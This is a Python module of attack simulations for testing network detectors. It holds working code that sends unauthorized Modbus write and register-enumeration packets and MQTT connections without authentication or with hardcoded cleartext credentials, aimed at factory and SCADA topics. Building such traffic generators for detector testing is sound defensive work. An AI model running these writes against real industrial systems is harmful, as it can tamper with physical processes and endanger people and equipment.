"""
OT/IoT attack simulation modules.

Tests against Watchtower detectors:
- watchtower.iot-ot.safety (ot.modbus.unauthorized_write)
- watchtower.iot-ot.safety (credential.cleartext.mqtt)
- watchtower.modbus.parser (function code extraction)
- watchtower.mqtt.parser (username/password flag detection)
"""

import os
import random
import socket
import struct
import time

from traffic_testing.attacks.base import BaseAttack
from traffic_testing.config import TARGET_IP, MQTT_BROKER_PORT, MODBUS_PORT


class ModbusUnauthorizedWrite(BaseAttack):
    WRITE_FUNCTION_CODES = {
        5: "Write Single Coil",
        6: "Write Single Register",
        15: "Write Multiple Coils",
        16: "Write Multiple Registers",
        22: "Mask Write Register",
        23: "Read/Write Multiple Registers",
    }

    def __init__(self, target_ip: str = TARGET_IP):
        super().__init__("modbus_unauthorized_write", "iot_ot", target_ip)

    def execute(self) -> None:
        for func_code, func_name in self.WRITE_FUNCTION_CODES.items():
            if self._stop_event.is_set():
                break
            for unit_id in [0, 1, 2, 255]:
                if self._stop_event.is_set():
                    break
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2.0)
                    s.connect((self.target_ip, MODBUS_PORT))
                    transaction_id = random.randint(0, 65535)
                    protocol_id = 0
                    length = 6
                    mbap = struct.pack(">HHH", transaction_id, protocol_id, length)
                    unit = unit_id
                    function = func_code
                    if func_code in [5, 6]:
                        data = struct.pack(">HH", random.randint(0, 100), random.randint(0, 1))
                    elif func_code in [15, 16]:
                        data = struct.pack(">HHH", random.randint(0, 100), 1, 1) + b"\x01"
                    elif func_code == 22:
                        data = struct.pack(">HHH", random.randint(0, 100), 0xFFFF, 0x0000)
                    elif func_code == 23:
                        data = struct.pack(">HHHHH", 0, 1, 0, 1, 1) + b"\x00"
                    else:
                        data = os.urandom(4)
                    packet = mbap + bytes([unit, function]) + data
                    s.send(packet)
                    try:
                        response = s.recv(1024)
                    except socket.timeout:
                        response = b""
                    self.log_packet({
                        "protocol": "Modbus",
                        "dst_ip": self.target_ip,
                        "dst_port": MODBUS_PORT,
                        "transaction_id": transaction_id,
                        "unit_id": unit_id,
                        "function_code": func_code,
                        "function_name": func_name,
                        "response_length": len(response),
                        "test_for": "ot.modbus.unauthorized_write",
                        "note": f"Modbus write (fc={func_code}) to unit {unit_id}",
                    })
                    s.close()
                except Exception as e:
                    self.log_packet({
                        "protocol": "Modbus",
                        "dst_ip": self.target_ip,
                        "dst_port": MODBUS_PORT,
                        "error": str(e),
                    })
                time.sleep(0.5)


class MQTTWithoutAuthentication(BaseAttack):
    def __init__(self, target_ip: str = TARGET_IP, port: int = MQTT_BROKER_PORT):
        super().__init__("mqtt_no_auth", "iot_ot", target_ip)
        self.port = port

    def execute(self) -> None:
        topics = [
            "factory/sensors/temperature",
            "factory/actuators/valve",
            "factory/control/plc1",
            "scada/hmi/status",
            "iot/device/telemetry",
        ]
        for topic in topics:
            if self._stop_event.is_set():
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2.0)
                s.connect((self.target_ip, self.port))
                connect_pkt = self._build_mqtt_connect(topic)
                s.send(connect_pkt)
                try:
                    s.recv(1024)
                except socket.timeout:
                    pass
                publish_pkt = self._build_mqtt_publish(topic, b"sensor_data=25.5")
                s.send(publish_pkt)
                self.log_packet({
                    "protocol": "MQTT",
                    "dst_ip": self.target_ip,
                    "dst_port": self.port,
                    "packet_type": "CONNECT",
                    "topic": topic,
                    "has_username": False,
                    "has_password": False,
                    "test_for": "credential.cleartext.mqtt",
                    "note": "MQTT CONNECT without authentication",
                })
                s.close()
            except Exception as e:
                self.log_packet({
                    "protocol": "MQTT",
                    "dst_ip": self.target_ip,
                    "dst_port": self.port,
                    "error": str(e),
                })
            time.sleep(1.0)

    def _build_mqtt_connect(self, topic: str) -> bytes:
        client_id = f"device_{random.randint(1000, 9999)}"
        variable_header = struct.pack(">H", 4)
        connect_flags = 0x02
        keep_alive = struct.pack(">H", 60)
        properties = b""
        payload = b""
        for part in client_id.split("/"):
            payload += struct.pack(">H", len(part)) + part.encode()
        remaining = variable_header + bytes([connect_flags]) + keep_alive + properties + payload
        fixed_header = bytes([0x10]) + self._encode_remaining_length(len(remaining))
        return fixed_header + remaining

    def _build_mqtt_publish(self, topic: str, message: bytes) -> bytes:
        topic_bytes = topic.encode()
        var_header = struct.pack(">H", len(topic_bytes)) + topic_bytes + b"\x00\x01"
        remaining = var_header + message
        fixed_header = bytes([0x30]) + self._encode_remaining_length(len(remaining))
        return fixed_header + remaining

    def _encode_remaining_length(self, length: int) -> bytes:
        result = bytearray()
        while True:
            byte = length % 128
            length = length // 128
            if length > 0:
                byte |= 0x80
            result.append(byte)
            if length == 0:
                break
        return bytes(result)


class MQTTWithCleartextCredentials(BaseAttack):
    def __init__(self, target_ip: str = TARGET_IP, port: int = MQTT_BROKER_PORT):
        super().__init__("mqtt_cleartext_creds", "iot_ot", target_ip)
        self.port = port

    def execute(self) -> None:
        credentials = [
            ("admin", "admin123"),
            ("sensor", "sensor!pass"),
            ("plc_operator", "PLC@Secure2024"),
        ]
        for username, password in credentials:
            if self._stop_event.is_set():
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2.0)
                s.connect((self.target_ip, self.port))
                connect_pkt = self._build_mqtt_connect_with_creds(username, password)
                s.send(connect_pkt)
                try:
                    s.recv(1024)
                except socket.timeout:
                    pass
                self.log_packet({
                    "protocol": "MQTT",
                    "dst_ip": self.target_ip,
                    "dst_port": self.port,
                    "packet_type": "CONNECT",
                    "has_username": True,
                    "has_password": True,
                    "username": username,
                    "password_length": len(password),
                    "test_for": "credential.cleartext.mqtt",
                    "note": f"MQTT CONNECT with cleartext credentials (user={username})",
                })
                s.close()
            except Exception as e:
                self.log_packet({
                    "protocol": "MQTT",
                    "dst_ip": self.target_ip,
                    "dst_port": self.port,
                    "error": str(e),
                })
            time.sleep(1.0)

    def _build_mqtt_connect_with_creds(self, username: str, password: str) -> bytes:
        client_id = f"device_{random.randint(1000, 9999)}"
        connect_flags = 0xC2
        keep_alive = struct.pack(">H", 60)
        properties = b""
        payload = b""
        payload += struct.pack(">H", len(client_id)) + client_id.encode()
        payload += struct.pack(">H", len(username)) + username.encode()
        payload += struct.pack(">H", len(password)) + password.encode()
        remaining = struct.pack(">H", 4) + bytes([connect_flags]) + keep_alive + properties + payload
        fixed_header = bytes([0x10]) + self._encode_remaining_length(len(remaining))
        return fixed_header + remaining

    def _encode_remaining_length(self, length: int) -> bytes:
        result = bytearray()
        while True:
            byte = length % 128
            length = length // 128
            if length > 0:
                byte |= 0x80
            result.append(byte)
            if length == 0:
                break
        return bytes(result)


class ModbusScanAndEnumerate(BaseAttack):
    def __init__(self, target_ip: str = TARGET_IP):
        super().__init__("modbus_enumerate", "iot_ot", target_ip)

    def execute(self) -> None:
        read_fc = {1: "Read Coils", 2: "Read Discrete Inputs", 3: "Read Holding Registers", 4: "Read Input Registers"}
        for func_code, func_name in read_fc.items():
            if self._stop_event.is_set():
                break
            for unit_id in range(0, 10):
                if self._stop_event.is_set():
                    break
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1.0)
                    s.connect((self.target_ip, MODBUS_PORT))
                    transaction_id = random.randint(0, 65535)
                    mbap = struct.pack(">HHH", transaction_id, 0, 6)
                    data = struct.pack(">HH", 0, 10)
                    packet = mbap + bytes([unit_id, func_code]) + data
                    s.send(packet)
                    try:
                        response = s.recv(1024)
                    except socket.timeout:
                        response = b""
                    self.log_packet({
                        "protocol": "Modbus",
                        "dst_ip": self.target_ip,
                        "dst_port": MODBUS_PORT,
                        "function_code": func_code,
                        "function_name": func_name,
                        "unit_id": unit_id,
                        "responded": len(response) > 0,
                        "test_for": "modbus.enumeration",
                    })
                    s.close()
                except Exception:
                    pass
                time.sleep(0.2)
